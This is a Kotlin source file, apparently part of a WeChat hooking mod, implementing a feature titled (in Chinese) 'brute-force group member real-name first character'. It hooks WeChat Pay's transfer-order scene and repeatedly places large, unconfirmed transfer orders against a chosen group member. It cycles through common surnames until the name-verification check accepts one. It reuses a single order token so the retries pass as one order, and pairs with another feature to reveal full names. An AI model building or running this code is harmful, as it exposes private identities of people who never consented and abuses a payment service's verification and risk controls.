package dev.ujhhgtg.wekit.features.items.chat

import android.app.Activity
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.LinearWavyProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.material3.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableIntState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.KeyboardType
import dev.ujhhgtg.reflekt.utils.createInstance
import dev.ujhhgtg.wekit.dexkit.abc.IResolveDex
import dev.ujhhgtg.wekit.dexkit.dsl.dexClass
import dev.ujhhgtg.wekit.features.api.core.WeDatabaseApi
import dev.ujhhgtg.wekit.features.api.net.WeNetSceneApi
import dev.ujhhgtg.wekit.features.api.net.WePacketHelper
import dev.ujhhgtg.wekit.features.api.net.models.protobuf.BeforeTransferProto
import dev.ujhhgtg.wekit.features.api.net.models.protobuf.BeforeTransferReqProto
import dev.ujhhgtg.wekit.features.api.ui.WeContactPrefsScreenApi
import dev.ujhhgtg.wekit.features.api.ui.WeCurrentConversationApi
import dev.ujhhgtg.wekit.features.core.Feature
import dev.ujhhgtg.wekit.features.core.SwitchFeature
import dev.ujhhgtg.wekit.ui.content.AlertDialogContent
import dev.ujhhgtg.wekit.ui.content.Button
import dev.ujhhgtg.wekit.ui.content.DefaultColumn
import dev.ujhhgtg.wekit.ui.content.TextButton
import dev.ujhhgtg.wekit.ui.utils.ShowComposeDialogScope
import dev.ujhhgtg.wekit.ui.utils.showComposeDialog
import dev.ujhhgtg.wekit.utils.WeLogger
import dev.ujhhgtg.wekit.utils.android.currentWxId
import dev.ujhhgtg.wekit.utils.android.showToastSuspend
import dev.ujhhgtg.wekit.utils.strings.isGroupChatWxId
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.ExperimentalSerializationApi
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import kotlin.coroutines.resume
import kotlin.time.Duration.Companion.seconds

@OptIn(ExperimentalSerializationApi::class)
@Feature(
    name = "爆破群成员实名首字",
    categories = ["聊天", "联系人详情页面"],
    description = "通过大额转账的姓名校验接口, 逐一尝试并还原群成员实名的首字 (与显示实名尾字功能配合可拼出完整姓名). 会向服务器发起多次转账下单 (不会真正扣款), 有触发风控的风险, 请自行承担"
)
object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
    WeContactPrefsScreenApi.IContactInfoProvider {

    private const val TAG = "BruteForceGroupMemberRealNamesFirstChar"
    private const val PREF_KEY = "exploit_real_name_first_char"

    /** WeChat's retcode for "姓名验证不正确" — i.e. the guessed [Char] was wrong. */
    private const val RETCODE_WRONG_NAME = "268502266"

    /** com.tencent.mm.plugin.remittance.model.q0 — NetSceneTenpayRemittanceGen (transferplaceorder). */
    private val classNetSceneTenpayRemittanceGen by dexClass {
        searchPackages("com.tencent.mm.plugin.remittance.model")
        matcher {
            usingEqStrings(
                "Micromsg.NetSceneTenpayRemittanceGen",
                "payScene: %s, channel: %s dynamicCodeUrl: %s mch_name: %s nickname: %s receiver_true_name %s placeorder_reserves: %s unpayType: %s cancel_outtradeno:%s cancel_reason:%s placeorderAttach:%s"
            )
        }
    }

    /**
     * Maps an in-flight [classNetSceneTenpayRemittanceGen] instance we created to the deferred
     * that awaits its parsed CGI response. Keyed by identity (the native scene doesn't override
     * equals/hashCode). The single [onEnable] hook on `onGYNetEnd` fans responses back here so
     * WeChat's own transfer flows never resolve our deferreds.
     */
    private val pendingPlaceOrders = ConcurrentHashMap<Any, CompletableDeferred<JSONObject?>>()

    override fun onEnable() {
        WeContactPrefsScreenApi.addProvider(this)

        // void onGYNetEnd(int errType, String errMsg, JSONObject resp)
        // Fires for every remittance placeorder (ours and WeChat's own); route only our instances.
        classNetSceneTenpayRemittanceGen.reflekt()
            .firstMethod { name = "onGYNetEnd" }
            .hookAfter {
                val deferred = pendingPlaceOrders.remove(thisObject) ?: return@hookAfter
                val resp = args.getOrNull(2) as? JSONObject
                WeLogger.d(TAG, "onGYNetEnd captured: errType=${args.getOrNull(0)}, errMsg=${args.getOrNull(1)}, resp=$resp")
                deferred.complete(resp)
            }
    }

    override fun onDisable() {
        WeContactPrefsScreenApi.removeProvider(this)
        pendingPlaceOrders.values.forEach { it.complete(null) }
        pendingPlaceOrders.clear()
    }

    // ── Contact-detail entry ──────────────────────────────────────────────────

    override fun getContactInfoItem(activity: Activity): List<WeContactPrefsScreenApi.PreferenceItem> {
        val memberId = activity.currentWxId ?: return emptyList()
        if (memberId.isGroupChatWxId) return emptyList()
        if (!WeCurrentConversationApi.value.isGroupChatWxId) return emptyList()

        return listOf(
            WeContactPrefsScreenApi.PreferenceItem(
                key = PREF_KEY,
                title = "爆破群成员实名首字",
                summary = "尝试实名首字",
                position = 1
            )
        )
    }

    override fun onItemClick(activity: Activity, key: String): Boolean {
        if (key != PREF_KEY) return false

        val memberId = activity.currentWxId ?: return true
        val groupId = WeCurrentConversationApi.value
        if (!groupId.isGroupChatWxId) return true

        showComposeDialog(activity) { ExploitDialog(memberId, groupId) }
        return true
    }

    // ── Network ───────────────────────────────────────────────────────────────

    /**
     * Holds the fixed per-session parameters that every transferplaceorder in a brute-force run
     * reuses: the target's masked real name, the `truename_extend` key from beforetransfer, and
     * a single `placeorder_reserves` token generated once so WeChat treats the retries as
     * continuations of the same order rather than fresh large transfers.
     */
    private data class TransferContext(
        val memberId: String,
        val groupId: String,
        val maskedRealName: String,
        val truenameExtend: String,
        val nickname: String,
        val amountYuan: Double,
        val placeorderReserves: String
    )

    /** Step 1: `/cgi-bin/mmpay-bin/beforetransfer` → masked real name + truename_extend key. */
    private suspend fun fetchBeforeTransfer(memberId: String, groupId: String): BeforeTransferProto? =
        suspendCancellableCoroutine { cont ->
            val reqBytes = BeforeTransferReqProto(userName = memberId, groupId = groupId).encode()
            WePacketHelper.sendCgiRaw("/cgi-bin/mmpay-bin/beforetransfer", 2783, 0, 0, reqBytes) {
                onSuccess { bytes ->
                    val proto = bytes?.let { runCatching { BeforeTransferProto.decode(it) }.getOrNull() }
                    if (cont.isActive) cont.resume(proto)
                }
                onFailure { errType, errCode, errMsg ->
                    WeLogger.w(TAG, "beforetransfer failed: errType=$errType errCode=$errCode errMsg=$errMsg")
                    if (cont.isActive) cont.resume(null)
                }
            }
        }

    /**
     * Step 2: build and dispatch a `transferplaceorder` ([classNetSceneTenpayRemittanceGen]) and
     * await its parsed JSON response via the [pendingPlaceOrders] routing hook.
     *
     * [inputName]/[checknameSign] are null on the probe call (to obtain the checkname challenge)
     * and set on each brute-force attempt. Placing an order does not move money — the actual
     * transfer requires a separate password-confirmed step that we never reach.
     */
    private suspend fun sendPlaceOrder(
        ctx: TransferContext,
        inputName: String?,
        checknameSign: String?
    ): JSONObject? {
        val deferred = CompletableDeferred<JSONObject?>()
        val scene = try {
            // 30-arg constructor (positions matched against a real transferplaceorder call):
            //  1 fee          2 feeType="1"   3 receiverName   4 maskTruename
            //  5 payScene=31  6 transferScene=2   7 desc=""     8 i19=0
            //  9 s5=null     10 s6=null    11 dynamicCodeUrl="" 12 mchName=null
            // 13 s9=null     14 channel=14 15 receiverOpenid="" 16 s11=""
            // 17 s12=null    18 nickname   19 receiverTruename  20 f2fEvent=null
            // 21 inputName   22 checknameSign  23 truenameExtend  24 placeorderReserves
            // 25 unpayType=0 26 cancelOuttradeno=""  27 cancelReason=0  28 groupUsername
            // 29 placeorderAttach=""  30 hasTryHkpay=false
            classNetSceneTenpayRemittanceGen.clazz.createInstance(
                ctx.amountYuan, "1", ctx.memberId, ctx.maskedRealName, 31, 2, "", 0, null, null,
                "", null, null, 14, "", "", null, ctx.nickname, ctx.maskedRealName, null,
                inputName, checknameSign, ctx.truenameExtend, ctx.placeorderReserves,
                0, "", 0, ctx.groupId, "", false
            )
        } catch (e: Throwable) {
            WeLogger.e(TAG, "failed to construct transferplaceorder scene", e)
            return null
        }

        pendingPlaceOrders[scene] = deferred
        try {
            WeNetSceneApi.sendNetScene(scene)
        } catch (e: Throwable) {
            WeLogger.e(TAG, "failed to enqueue transferplaceorder scene", e)
            pendingPlaceOrders.remove(scene)
            return null
        }

        return withTimeoutOrNull(1.5.seconds) { deferred.await() }.also {
            pendingPlaceOrders.remove(scene)
            if (it == null) WeLogger.w(TAG, "transferplaceorder timed out (inputName=$inputName)")
        }
    }

    // ── Brute-force orchestration ───────────────────────────────────────────────

    private sealed interface RunResult {
        /** Found the first char (and, if the challenge only asked for it, the whole revealed name). */
        data class Found(val char: String, val displayName: String) : RunResult

        /** Server said no name check is required for this transfer — nothing to brute-force. */
        data object NoCheckNeeded : RunResult
        data class Failed(val reason: String) : RunResult

        /** User aborted mid-run; carries how far we got. */
        data class Aborted(val tried: Int) : RunResult
    }

    private class RunState(
        val tried: MutableIntState,
        val total: Int,
        @Volatile var cancelled: Boolean = false
    )

    /**
     * Full pipeline: beforetransfer → probe placeorder (to get the checkname challenge) → try each
     * surname as `input_name`, reusing the challenge's `checkname_sign`, until one is accepted.
     *
     * A wrong guess comes back with retcode [RETCODE_WRONG_NAME]; anything else non-empty is treated
     * as the accepted name (retcode "0") or an unexpected error that aborts the run.
     */
    private suspend fun runBruteForce(
        memberId: String,
        groupId: String,
        amountYuan: Double,
        state: RunState
    ): RunResult {
        val before = fetchBeforeTransfer(memberId, groupId)
            ?: return RunResult.Failed("beforetransfer 失败 (可能被删除/拉黑/账号异常)")
        val maskedRealName = before.maskedRealName
            ?: return RunResult.Failed("CGI 未返回实名尾字")
        val key = before.key ?: return RunResult.Failed("CGI 未返回 truename_extend 密钥")

        val contact = WeDatabaseApi.getFriend(memberId)
        val nickname = contact?.let { it.remarkName.ifEmpty { it.nickname } } ?: memberId

        val ctx = TransferContext(
            memberId = memberId,
            groupId = groupId,
            maskedRealName = maskedRealName,
            truenameExtend = key,
            nickname = nickname,
            amountYuan = amountYuan,
            placeorderReserves = System.currentTimeMillis().toString()
        )

        // Probe: no input_name / checkname_sign → server returns the namemessage challenge.
        val probe = sendPlaceOrder(ctx, inputName = null, checknameSign = null)
            ?: return RunResult.Failed("下单探测请求无响应 (超时)")

        WeLogger.i(TAG, "probe response: $probe")

        val needCheckName = probe.optInt("need_checkname", 0)
        if (needCheckName != 1) {
            return RunResult.NoCheckNeeded
        }

        val nameMessage = probe.optJSONObject("namemessage")
            ?: return RunResult.Failed("响应缺少 namemessage")
        val checknameSign = nameMessage.optString("checkname_sign")
        val displayName = nameMessage.optString("display_name")
        if (checknameSign.isNullOrEmpty()) {
            return RunResult.Failed("响应缺少 checkname_sign")
        }
        WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign")

        for ((index, candidate) in COMMON_SURNAMES.withIndex()) {
            if (state.cancelled) return RunResult.Aborted(index)

            val resp = sendPlaceOrder(ctx, inputName = candidate, checknameSign = checknameSign)
            state.tried.intValue = index + 1

            if (resp == null) {
                WeLogger.w(TAG, "guess '$candidate' timed out, continuing")
                delay(3.seconds)
                continue
            }

            val retcode = resp.optString("retcode")
            WeLogger.d(TAG, "guess '$candidate' → retcode=$retcode")

            when {
                retcode == RETCODE_WRONG_NAME -> {
                    // wrong first char, keep going (rate-limit friendly)
                    delay(5.seconds)
                }

                retcode.isNullOrEmpty() || retcode == "0" -> {
                    return RunResult.Found(candidate, displayName)
                }

                else -> {
                    // Unexpected retcode: sign may have expired or risk control kicked in
//                    return RunResult.Failed("意外的 retcode=$retcode (可能触发风控或 sign 失效)")
                    showToastSuspend("警告: 意外的 retcode=$retcode (可能触发风控或 sign 失效)!")
                    delay(5.seconds)
                }
            }
        }

        return RunResult.Failed("已尝试全部 ${COMMON_SURNAMES.size} 个常见姓氏, 未命中")
    }

    // ── Dialog ──────────────────────────────────────────────────────────────────

    private sealed interface Phase {
        data object Idle : Phase
        data class Running(val state: RunState) : Phase
        data class Done(val result: RunResult) : Phase
    }

    @Composable
    private fun ShowComposeDialogScope.ExploitDialog(
        memberId: String,
        groupId: String
    ) {
        var phase by remember { mutableStateOf<Phase>(Phase.Idle) }
        var amountInput by remember { mutableStateOf("100000") }

        LaunchedEffect(phase) {
            val current = phase
            if (current is Phase.Running) {
                dialog.setCancelable(false)
                CoroutineScope(Dispatchers.IO).launch {
                    val amount = amountInput.toDoubleOrNull()?.takeIf { it > 0 } ?: 100000.0
                    val result = runBruteForce(memberId, groupId, amount, current.state)
                    if (phase is Phase.Running) {
                        phase = Phase.Done(result)
                        dialog.setCancelable(true)
                    }
                }
            }
        }

        AlertDialogContent(
            title = { Text(if (phase is Phase.Idle) "警告" else "爆破群成员实名首字") },
            text = {
                DefaultColumn(Modifier.verticalScroll(rememberScrollState())) {
                    when (val current = phase) {
                        is Phase.Idle -> {
                            Text(
                                "此功能会以设定金额向该成员发起多次转账下单请求 (仅下单, 不会真正扣款), " +
                                    "逐一尝试实名首字. 可能触发微信风控, 风险自负.\n\n" +
                                    "金额需足够大以触发姓名校验 (默认 10 万元). 与「显示群成员实名尾字」配合可拼出姓名."
                            )
                            TextField(
                                value = amountInput,
                                onValueChange = { amountInput = it.filter { c -> c.isDigit() }.take(7) },
                                label = { Text("转账金额 (元)") },
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                singleLine = true
                            )
                        }

                        is Phase.Running -> {
                            val tried by current.state.tried
                            val total = current.state.total
                            Text("正在尝试, 请稍等...\n已尝试: $tried/$total")
                            LinearWavyProgressIndicator(progress = { if (total == 0) 0f else tried.toFloat() / total })
                        }

                        is Phase.Done -> when (val r = current.result) {
                            is RunResult.Found ->
                                Text("命中! 实名首字为「${r.char}」\n\n校验掩码: ?${r.displayName}")
                            RunResult.NoCheckNeeded ->
                                Text("该成员无需姓名校验即可转账 (无法通过此方式获取首字)")
                            is RunResult.Failed ->
                                Text("失败: ${r.reason}")
                            is RunResult.Aborted ->
                                Text("已终止 (尝试了 ${r.tried} 个)")
                        }
                    }
                }
            },
            confirmButton = {
                when (phase) {
                    is Phase.Idle -> Button(onClick = {
                        phase = Phase.Running(
                            RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                        )
                    }) { Text("开始") }

                    is Phase.Done -> Button(onDismiss) { Text("关闭") }
                    else -> {}
                }
            },
            dismissButton = {
                when (val current = phase) {
                    is Phase.Idle -> TextButton(onDismiss) { Text("取消") }
                    is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) { Text("终止") }
                    is Phase.Done -> {}
                }
            }
        )
    }
}


